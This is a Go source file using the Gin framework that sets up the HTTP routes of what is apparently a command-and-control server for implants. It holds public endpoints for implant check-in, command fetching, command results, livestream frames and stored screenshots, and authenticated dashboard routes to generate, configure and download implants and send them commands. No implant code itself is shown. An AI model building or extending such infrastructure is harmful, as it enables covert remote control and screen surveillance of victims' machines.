// Package routes 
package routes

import (
	"awesomeProject/controllers"
	"awesomeProject/middleware"
	"path/filepath" 
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

func SetupRouter() *gin.Engine {
	r := gin.Default()

	// Add CORS middleware
	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"http://localhost:3000", "http://127.0.0.1:3000"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	
	absScreenshotPath, _ := filepath.Abs("./c2_screenshots") // Get absolute path
	r.StaticFS("/c2_screenshots", gin.Dir(absScreenshotPath, false))

	// Public routes for implant communication
	r.POST("/checkin", controllers.CheckinImplant)
	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands)
	r.POST("/command-result", controllers.HandleCommandResult)
	r.POST("/livestream-frame", controllers.HandleLivestreamFrame) 

	// Public routes for user auth
	r.POST("/register", controllers.Register)
	r.POST("/login", controllers.Login)

	// Protected routes 
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware())
	{
		protected.GET("/implants", controllers.GetUserImplants)
		protected.POST("/generate-implant", controllers.GenerateImplant)
		protected.POST("/send-command", controllers.SendCommand)
		protected.GET("/implants/:implant_id/commands", controllers.DashboardGetCommandsForImplant)
		protected.DELETE("/implants/:implant_id", controllers.DeleteImplant)
		protected.POST("/implants/:implant_id/download-configured", controllers.DownloadConfiguredImplant)
		protected.GET("/implants/:implant_id/download", controllers.DownloadImplant) // Legacy/generic
		protected.GET("/implants/:implant_id/screenshots", controllers.GetScreenshotsForImplant)
	}

	return r
}
